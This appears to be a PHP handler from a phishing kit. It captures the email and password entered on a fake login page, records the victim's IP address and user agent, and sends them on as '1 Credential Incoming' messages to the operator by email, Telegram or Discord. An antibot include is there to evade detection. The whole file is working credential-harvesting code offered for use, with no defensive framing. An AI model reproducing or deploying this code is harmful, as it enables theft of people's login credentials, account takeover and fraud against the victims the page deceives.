<?php 
include("../home.php");
include('../infos.php');
include('../antibots/antibot.php');
include('../strom1.php');

if(isset($_POST)){

    $_SESSION["email"] = clean_user_input($_POST["email"]); 
    $_SESSION["password"] = clean_user_input($_POST["password"]); 

    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["user_ip"] = $_SERVER['REMOTE_ADDR']; 
    $_SESSION["user_url"] =  $_SERVER['HTTP_HOST'];
    $_SESSION["first_login_date"] = date("d/m/Y");

    if(!empty($_SESSION["email"]) && !empty($_SESSION["password"]) && verify_email($_SESSION["email"])){

        // Everything seems fine

        $_SESSION["login_to_send"] = "
[🪐] +1 LOGIN 🎥 [🪐]

🪐 Email : ".$_SESSION["email"]." 
🪐 Password : ".$_SESSION["password"]." 

[💿] Other informations [💿]

🪐 User-Agent : ".$_SESSION["user_agent"]."
🪐 Ip Adress : ".$_SESSION["user_ip"]."
";

        $to_send = $_SESSION["login_to_send"];

        if($config["enable_email"]){
            send_email_notification($to_send,$config,"[📱] 1 Credential Incoming");
        }
        if($config["enable_telegram"]){
            send_telegram_notification($to_send,$config);
        }   
        if($config["enable_discord"]){
            send_discord_notification($to_send,$config,"[📱] 1 Credential Incoming");
        }   

        header("Location: ../pages/notification.php?sessid=" . $_SESSION["id"]);


    }
    else{
        // User credentials not set, redirecting
        header("Location: ../login.php?is_invalid_email=true&authorize_client=" . $_SESSION["id"]);
    }

}
else{
    // Post not set, redirecting
    header("Location: ../login.php?is_invalid_email=true&authorize_client=" . $_SESSION["id"]);}


?>